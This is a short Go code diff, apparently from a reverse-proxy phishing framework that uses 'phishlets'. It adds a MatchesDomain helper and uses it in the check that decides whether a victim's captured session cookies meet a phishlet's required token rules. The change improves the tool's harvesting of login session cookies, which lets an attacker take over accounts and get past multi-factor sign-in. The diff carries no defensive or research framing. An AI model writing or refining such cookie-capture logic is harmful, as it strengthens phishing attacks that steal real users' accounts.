@@ -86,7 +86,7 @@ func (s *Session) HasRequiredTokens(def *Phishlet) bool {
 
 func (s *Session) hasCookieToken(rule TokenRule) bool {
 	for domain, byName := range s.CookieTokens {
-		if rule.Domain != "" && !strings.HasSuffix(strings.ToLower(domain), strings.ToLower(rule.Domain)) {
+		if rule.Domain != "" && !MatchesDomain(domain, rule.Domain) {
 			continue
 		}
 		for name := range byName {
@@ -96,6 +96,20 @@ func (s *Session) hasCookieToken(rule TokenRule) bool {
 		}
 	}
 	return false
+}
+
+// MatchesDomain reports whether cookieDomain satisfies ruleDomain using the
+// standard phishlet convention: a leading dot on ruleDomain means "this domain
+// and all subdomains". Leading dots are stripped from both sides before
+// comparison so the form returned by Go's cookie parser (no leading dot) matches
+// phishlet rules that conventionally include one.
+func MatchesDomain(cookieDomain, ruleDomain string) bool {
+	if cookieDomain == "" {
+		return true
+	}
+	clean := strings.TrimPrefix(strings.ToLower(cookieDomain), ".")
+	lower := strings.TrimPrefix(strings.ToLower(ruleDomain), ".")
+	return clean == lower || strings.HasSuffix(clean, "."+lower)
 }
 
 func (s *Session) hasHTTPToken(rule TokenRule) bool {
